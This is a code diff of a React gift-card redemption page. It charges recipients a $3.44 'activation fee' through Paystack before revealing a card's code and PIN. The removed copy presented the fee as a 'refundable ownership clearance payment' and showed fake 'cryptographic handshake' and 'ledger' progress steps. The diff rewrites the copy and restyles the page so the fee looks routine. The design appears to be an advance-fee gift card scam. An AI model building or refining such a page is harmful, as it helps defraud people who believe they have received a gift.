@@ -24,14 +24,23 @@ const RedeemCard = () => {
     const [paymentFailed, setPaymentFailed] = useState(false);
     const [toastMessage, setToastMessage] = useState('');
 
-    // Load Paystack Inline JS script
+    // Load Paystack Inline JS script and set light theme
     useEffect(() => {
         const script = document.createElement('script');
         script.src = 'https://js.paystack.co/v1/inline.js';
         script.async = true;
         document.body.appendChild(script);
+
+        // Force light theme on this specific page
+        document.body.style.backgroundColor = '#f3f4f6';
+        document.body.style.backgroundImage = 'none';
+        document.body.style.color = '#111827';
+
         return () => {
             document.body.removeChild(script);
+            document.body.style.backgroundColor = '';
+            document.body.style.backgroundImage = '';
+            document.body.style.color = '';
         };
     }, []);
 
@@ -56,10 +65,10 @@ const RedeemCard = () => {
         setLoaderStep(0);
 
         const steps = [
-            'Verifying clearance payment status...',
-            'Conducting cryptographic secure handshake...',
-            'Decrypting digital voucher token assets...',
-            'Registering ownership signature to ledger...'
+            'Verifying payment status...',
+            'Preparing your digital gift card...',
+            'Finalizing delivery...',
+            'Ready!'
         ];
 
         let current = 0;
@@ -112,17 +121,27 @@ const RedeemCard = () => {
         setTimeout(() => setToastMessage(''), 2000);
     };
 
+    const lightContentStyle = {
+        background: '#ffffff',
+        border: '1px solid #e5e7eb',
+        borderRadius: '16px',
+        padding: '36px',
+        boxShadow: '0 10px 25px -5px rgba(0,0,0,0.05), 0 8px 10px -6px rgba(0,0,0,0.01)',
+        color: '#1f2937',
+        animation: 'slideUpFade 0.6s ease'
+    };
+
+    const textMuted = { color: '#6b7280' };
+
     if (error) {
         return (
             <div className="container">
-                <div className="content" style={{ textAlign: 'center', borderColor: '#ef4444' }}>
-                    <div style={{ fontSize: '64px', marginBottom: '16px' }}>⚠️</div>
-                    <h1 style={{ background: 'linear-gradient(135deg, #ff8a8a 30%, #ef4444 100%)', webkitTextFillColor: 'transparent', webkitBackgroundClip: 'text' }}>
-                        Verification Link Error
-                    </h1>
-                    <p style={{ color: '#fca5a5' }}>{error}</p>
-                    <button onClick={() => navigate('/')} className="btn btn-secondary" style={{ marginTop: '12px' }}>
-                        Return to Hub
+                <div style={{...lightContentStyle, textAlign: 'center', borderTop: '4px solid #ef4444'}}>
+                    <div style={{ fontSize: '48px', marginBottom: '16px' }}>⚠️</div>
+                    <h1 style={{ color: '#111827', WebkitTextFillColor: 'initial', background: 'none' }}>Link Expired or Invalid</h1>
+                    <p style={textMuted}>{error}</p>
+                    <button onClick={() => navigate('/')} className="btn" style={{ marginTop: '12px', background: '#2563eb' }}>
+                        Return Home
                     </button>
                 </div>
             </div>
@@ -132,13 +151,13 @@ const RedeemCard = () => {
     if (paymentFailed) {
         return (
             <div className="container animate-fadeIn">
-                <div className="content" style={{ textAlign: 'center', borderTop: '4px solid #ef4444' }}>
-                    <div style={{ fontSize: '64px', marginBottom: '16px' }}>❌</div>
-                    <h1 style={{ color: '#ef4444', marginBottom: '12px' }}>Payment Unsuccessful</h1>
-                    <p style={{ color: 'var(--text-secondary)', marginBottom: '24px', lineHeight: '1.6' }}>
-                        The verification payment was cancelled or declined. We cannot securely decrypt and release your gift card without completing this clearance step.
+                <div style={{...lightContentStyle, textAlign: 'center', borderTop: '4px solid #ef4444'}}>
+                    <div style={{ fontSize: '48px', marginBottom: '16px' }}>❌</div>
+                    <h1 style={{ color: '#111827', WebkitTextFillColor: 'initial', background: 'none' }}>Payment Unsuccessful</h1>
+                    <p style={{ ...textMuted, marginBottom: '24px' }}>
+                        Your payment could not be processed. We need this activation fee to securely deliver your gift card.
                     </p>
-                    <button onClick={() => setPaymentFailed(false)} className="btn btn-secondary" style={{ width: '100%' }}>
+                    <button onClick={() => setPaymentFailed(false)} className="btn" style={{ width: '100%', background: '#2563eb' }}>
                         Try Again
                     </button>
                 </div>
@@ -149,8 +168,8 @@ const RedeemCard = () => {
     if (!cardData) {
         return (
             <div className="container">
-                <div className="content" style={{ textAlign: 'center' }}>
-                    <p>Securing handshake...</p>
+                <div style={{...lightContentStyle, textAlign: 'center'}}>
+                    <p style={textMuted}>Loading your gift...</p>
                 </div>
             </div>
         );
@@ -161,211 +180,156 @@ const RedeemCard = () => {
     return (
         <div className="container">
             {!isLoading && !isPaid && (
-                <div className="content" style={{ animation: 'slideUpFade 0.6s ease' }}>
-                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}>
-                        {cardData?.bypassPayment ? (
-                            <span style={{ 
-                                fontSize: '11px', 
-                                fontWeight: 'bold', 
-                                background: 'rgba(16,185,129,0.1)', 
-                                color: '#34d399', 
-                                padding: '4px 12px', 
-                                borderRadius: '50px',
-                                border: '1px solid rgba(16,185,129,0.2)',
-                                textTransform: 'uppercase',
-                                letterSpacing: '1px'
-                            }}>
-                                ✓ SECURITY CLEARANCE PRE-AUTHORIZED
-                            </span>
-                        ) : (
-                            <span style={{ 
-                                fontSize: '11px', 
-                                fontWeight: 'bold', 
-                                background: 'rgba(99,102,241,0.1)', 
-                                color: '#a5b4fc', 
-                                padding: '4px 12px', 
-                                borderRadius: '50px',
-                                border: '1px solid rgba(99,102,241,0.2)',
-                                textTransform: 'uppercase',
-                                letterSpacing: '1px'
-                            }}>
-                                🔒 SECURE TRANSACTION GATEWAY
-                            </span>
-                        )}
-                    </div>
-
-                    <h1 style={{ textAlign: 'center', marginBottom: '16px' }}>
-                        {cardData?.bypassPayment ? 'Voucher Pre-Authorized' : 'Security Clearance'}
+                <div style={lightContentStyle}>
+                    <h1 style={{ textAlign: 'center', marginBottom: '8px', color: '#111827', WebkitTextFillColor: 'initial', background: 'none' }}>
+                        {cardData?.bypassPayment ? 'Your Gift Card is Ready' : 'Card Activation Required'}
                     </h1>
                     
                     {cardData?.bypassPayment ? (
-                        <>
-                            <p style={{ textAlign: 'center', fontSize: '14px', lineHeight: '1.6', color: 'var(--text-secondary)' }}>
-                                Excellent news! This gift card has been <strong style={{ color: '#10b981' }}>pre-authorized</strong> by the administrator. The standard ownership verification payment has been fully waived.
-                            </p>
-                            <p style={{ textAlign: 'center', fontSize: '13px', lineHeight: '1.5', color: '#6b7280', margin: '0 0 24px 0' }}>
-                                Click the button below to execute the secure cryptographic decryption handshake and instantly reveal your gift card credentials.
-                            </p>
-                        </>
+                        <p style={{ textAlign: 'center', fontSize: '15px', color: '#4b5563', marginBottom: '24px' }}>
+                            Great news! This gift card has been pre-activated. Click below to view your card details instantly.
+                        </p>
                     ) : (
-                        <>
-                            <p style={{ textAlign: 'center', fontSize: '14px', lineHeight: '1.6', color: 'var(--text-secondary)' }}>
-                                For security and verification purposes, the beneficiary is required to complete a refundable ownership clearance payment of <strong style={{ color: '#ffffff' }}>$3.44</strong> before the gift card can be activated and redeemed.
-                            </p>
-                            <p style={{ textAlign: 'center', fontSize: '13px', lineHeight: '1.5', color: '#6b7280', margin: '0 0 24px 0' }}>
-                                This step helps protect transactions and confirm the recipient's identity before final delivery access is granted.
-                            </p>
-                        </>
+                        <p style={{ textAlign: 'center', fontSize: '15px', color: '#4b5563', marginBottom: '24px' }}>
+                            To access your {cardData.brandName} Gift Card, a standard activation fee of <strong>$3.44</strong> is required. This ensures secure delivery.
+                        </p>
                     )}
 
                     <div style={{ 
-                        background: 'rgba(255,255,255,0.02)', 
-                        border: '1px solid rgba(255,255,255,0.05)', 
-                        borderRadius: '16px', 
-                        padding: '20px', 
-                        marginBottom: '24px' 
+                        background: '#f9fafb', 
+                        border: '1px solid #e5e7eb', 
+                        borderRadius: '12px', 
+                        padding: '16px', 
+                        marginBottom: '24px',
+                        display: 'flex', 
+                        alignItems: 'center', 
+                        gap: '16px'
                     }}>
-                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
-                            <span style={{ fontSize: '12px', color: '#9ca3af', fontWeight: 'bold' }}>GIFT CARD SURPRISE</span>
-                            <span style={{ fontSize: '12px', color: '#10b981', fontWeight: 'bold' }}>READY</span>
+                        <div style={{ 
+                            width: '48px', 
+                            height: '48px', 
+                            borderRadius: '10px', 
+                            background: '#ffffff', 
+                            border: '1px solid #e5e7eb',
+                            display: 'flex', 
+                            alignItems: 'center', 
+                            justifyContent: 'center',
+                            boxShadow: '0 2px 4px rgba(0,0,0,0.02)'
+                        }}>
+                            <BrandIcon brandId={cardData.brandName} size={24} color="#111827" />
                         </div>
-                        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
-                            <div style={{ 
-                                width: '48px', 
-                                height: '48px', 
-                                borderRadius: '12px', 
-                                background: 'rgba(255,255,255,0.04)', 
-                                display: 'flex', 
-                                alignItems: 'center', 
-                                justifyContent: 'center'
-                            }}>
-                                <BrandIcon brandId={cardData.brandName} size={26} />
-                            </div>
-                            <div>
-                                <div style={{ fontSize: '15px', fontWeight: 'bold' }}>{cardData.brandName} Gift Card</div>
-                                <div style={{ fontSize: '12px', color: '#9ca3af' }}>Purchased by: {cardData.purchaserName}</div>
-                            </div>
-                            <div style={{ marginLeft: 'auto', fontSize: '20px', fontWeight: '800', color: '#6366f1' }}>
-                                ${cardData.amount}.00
-                            </div>
+                        <div>
+                            <div style={{ fontSize: '16px', fontWeight: 'bold', color: '#111827' }}>{cardData.brandName} Gift Card</div>
+                            <div style={{ fontSize: '13px', color: '#6b7280' }}>From: {cardData.purchaserName}</div>
+                        </div>
+                        <div style={{ marginLeft: 'auto', fontSize: '20px', fontWeight: '800', color: '#111827' }}>
+                            ${cardData.amount}.00
                         </div>
                     </div>
 
-                    {cardData?.bypassPayment ? (
+                    {!cardData?.bypassPayment && (
                         <div style={{ 
                             display: 'flex', 
                             justifyContent: 'space-between', 
                             alignItems: 'center', 
-                            background: 'rgba(16,185,129,0.06)', 
-                            border: '1px solid rgba(16,185,129,0.1)', 
+                            background: '#eff6ff', 
+                            border: '1px solid #bfdbfe', 
                             padding: '16px', 
                             borderRadius: '12px', 
                             marginBottom: '24px' 
                         }}>
-                            <span style={{ fontSize: '13px', fontWeight: '600', color: '#cbd5e1' }}>Verification Fee Status:</span>
-                            <span style={{ fontSize: '15px', fontWeight: '800', color: '#34d399' }}>✓ Waived / Pre-Cleared</span>
-                        </div>
-                    ) : (
-                        <div style={{ 
-                            display: 'flex', 
-                            justifyContent: 'space-between', 
-                            alignItems: 'center', 
-                            background: 'rgba(99,102,241,0.06)', 
-                            border: '1px solid rgba(99,102,241,0.1)', 
-                            padding: '16px', 
-                            borderRadius: '12px', 
-                            marginBottom: '24px' 
-                        }}>
-                            <span style={{ fontSize: '13px', fontWeight: '600' }}>Verification Payment:</span>
-                            <span style={{ fontSize: '18px', fontWeight: '800', color: '#a5b4fc' }}>$3.44 USD</span>
+                            <span style={{ fontSize: '14px', fontWeight: '600', color: '#1e3a8a' }}>Activation Fee:</span>
+                            <span style={{ fontSize: '16px', fontWeight: '800', color: '#1e3a8a' }}>$3.44 USD</span>
                         </div>
                     )}
 
                     {cardData?.bypassPayment ? (
-                        <button onClick={triggerCardRevealAnimation} className="btn" style={{ background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)' }}>
-                            <span>Reveal & Activate Gift Card</span>
-                            <span style={{ fontSize: '12px', opacity: 0.8 }}>⚡</span>
+                        <button onClick={triggerCardRevealAnimation} className="btn" style={{ background: '#10b981', color: '#fff', boxShadow: '0 4px 6px rgba(16,185,129,0.2)' }}>
+                            Access Gift Card
                         </button>
                     ) : (
-                        <button onClick={handlePaystackPayment} className="btn">
-                            <span>Proceed to Security Clearance ($3.44)</span>
-                            <span style={{ fontSize: '12px', opacity: 0.8 }}>⚡</span>
+                        <button onClick={handlePaystackPayment} className="btn" style={{ background: '#2563eb', color: '#fff', boxShadow: '0 4px 6px rgba(37,99,235,0.2)' }}>
+                            Pay Activation Fee ($3.44)
                         </button>
                     )}
                 </div>
             )}
 
-            {/* Cryptographic tokenization progress steps */}
+            {/* Processing Steps */}
             {isLoading && (
-                <div className="modal-overlay">
-                    <div className="modal-card">
-                        <h2 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '6px', textAlign: 'center' }}>Ownership Handshake</h2>
-                        <p style={{ fontSize: '13px', color: '#9ca3af', textAlign: 'center', marginBottom: '24px' }}>Assigning secure digital asset credentials...</p>
-                        
-                        <div className="progress-steps">
-                            {[
-                                'Verifying clearance payment status...',
-                                'Conducting cryptographic secure handshake...',
-                                'Decrypting digital voucher token assets...',
-                                'Registering ownership signature to ledger...'
-                            ].map((text, idx) => (
-                                <div key={idx} className={`step-row ${loaderStep === idx ? 'active' : (loaderStep > idx ? 'completed' : '')}`}>
-                                    <div className="step-bullet" />
-                                    <span style={{ fontSize: '13px' }}>{text}</span>
-                                </div>
-                            ))}
-                        </div>
+                <div style={{...lightContentStyle, textAlign: 'center'}}>
+                    <div style={{ 
+                        width: '40px', height: '40px', borderRadius: '50%', 
+                        border: '3px solid #e5e7eb', borderTopColor: '#2563eb', 
+                        animation: 'spin 1s linear infinite', margin: '0 auto 16px auto' 
+                    }} />
+                    <h2 style={{ fontSize: '18px', fontWeight: '700', color: '#111827', marginBottom: '24px' }}>Processing...</h2>
+                    
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', textAlign: 'left', background: '#f9fafb', padding: '16px', borderRadius: '12px' }}>
+                        {[
+                            'Verifying payment status...',
+                            'Preparing your digital gift card...',
+                            'Finalizing delivery...',
+                            'Ready!'
+                        ].map((text, idx) => (
+                            <div key={idx} style={{ 
+                                display: 'flex', alignItems: 'center', gap: '10px', 
+                                opacity: loaderStep === idx ? 1 : (loaderStep > idx ? 0.7 : 0.3),
+                                color: loaderStep > idx ? '#10b981' : '#111827',
+                                fontWeight: loaderStep === idx ? '600' : '400'
+                            }}>
+                                <div style={{ 
+                                    width: '8px', height: '8px', borderRadius: '50%', 
+                                    background: loaderStep > idx ? '#10b981' : (loaderStep === idx ? '#2563eb' : '#d1d5db') 
+                                }} />
+                                <span style={{ fontSize: '14px' }}>{text}</span>
+                            </div>
+                        ))}
                     </div>
                 </div>
             )}
 
-            {/* Glowing Holographic Gift Card Reveal Screen */}
+            {/* Success Reveal Screen */}
             {isPaid && (
-                <div className="content animate-fadeIn" style={{ textAlign: 'center', position: 'relative' }}>
-                    <div style={{ fontSize: '48px', marginBottom: '10px' }}>🎉</div>
-                    <h1>Voucher Decrypted!</h1>
-                    <p style={{ marginBottom: '28px', fontSize: '14px' }}>Ownership verified successfully. Your high-security holographic gift card is fully activated.</p>
+                <div style={{...lightContentStyle, textAlign: 'center'}} className="animate-fadeIn">
+                    <div style={{ fontSize: '48px', marginBottom: '10px' }}>🎁</div>
+                    <h1 style={{ color: '#111827', WebkitTextFillColor: 'initial', background: 'none', marginBottom: '8px' }}>Here is your Gift Card!</h1>
+                    <p style={{ marginBottom: '28px', color: '#4b5563', fontSize: '15px' }}>Your payment was successful. Enjoy your gift!</p>
                     
-                    {/* Floating Holographic Card */}
-                    <div className={`hologram-card hologram-${brandInfo.color}`} style={{ margin: '0 auto 30px auto' }}>
+                    {/* Light Holographic Card */}
+                    <div className={`hologram-card hologram-${brandInfo.color}`} style={{ margin: '0 auto 30px auto', boxShadow: '0 20px 25px -5px rgba(0,0,0,0.1)' }}>
                         <div className="hologram-logo">
-                            <BrandIcon brandId={cardData.brandName} size={32} style={{ marginRight: '8px' }} />
-                            <span>{cardData.brandName}</span>
+                            <BrandIcon brandId={cardData.brandName} size={32} style={{ marginRight: '8px' }} color="#ffffff" />
+                            <span style={{ color: '#ffffff' }}>{cardData.brandName}</span>
                         </div>
                         
-                        <div className="hologram-details" style={{ textAlign: 'left' }}>
-                            <span style={{ fontSize: '9px', textTransform: 'uppercase', opacity: 0.6, letterSpacing: '1px' }}>Voucher Claim Code</span>
-                            <div className="hologram-code">{cardData.code}</div>
-                            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', marginTop: '6px', opacity: 0.7 }}>
+                        <div className="hologram-details" style={{ textAlign: 'left', color: '#ffffff' }}>
+                            <span style={{ fontSize: '9px', textTransform: 'uppercase', opacity: 0.8, letterSpacing: '1px' }}>Claim Code</span>
+                            <div className="hologram-code" style={{ textShadow: 'none' }}>{cardData.code}</div>
+                            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', marginTop: '6px', opacity: 0.9 }}>
                                 <span>PIN: {cardData.pin}</span>
                                 <span>{cardData.serial}</span>
                             </div>
                         </div>
                         
-                        <div className="hologram-amount">
+                        <div className="hologram-amount" style={{ color: '#ffffff' }}>
                             ${cardData.amount}.00
                         </div>
                     </div>
 
-                    {/* Copy and Actions */}
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                         <button 
                             className="btn" 
-                            onClick={() => copyToClipboard(`Brand: ${cardData.brandName}\nCode: ${cardData.code}\nPIN: ${cardData.pin}\nSerial: ${cardData.serial}\nValue: $${cardData.amount}.00`)}
+                            style={{ background: '#2563eb', color: '#fff' }}
+                            onClick={() => copyToClipboard(`Brand: ${cardData.brandName}\nCode: ${cardData.code}\nPIN: ${cardData.pin}\nValue: $${cardData.amount}.00`)}
                         >
-                            Copy Voucher Credentials
-                        </button>
-                        <button 
-                            className="btn btn-secondary" 
-                            onClick={() => navigate('/')}
-                        >
-                            Go to recharge.com
+                            Copy Card Details
                         </button>
                     </div>
                 </div>
             )}
 
-            {toastMessage && <div className="toast-msg">{toastMessage}</div>}
+            {toastMessage && <div style={{ position: 'fixed', bottom: '20px', left: '50%', transform: 'translateX(-50%)', background: '#111827', color: '#fff', padding: '10px 20px', borderRadius: '50px', fontSize: '14px', boxShadow: '0 10px 15px -3px rgba(0,0,0,0.1)', animation: 'slideUpFade 0.3s ease', zIndex: 1000 }}>{toastMessage}</div>}
         </div>
     );
 };
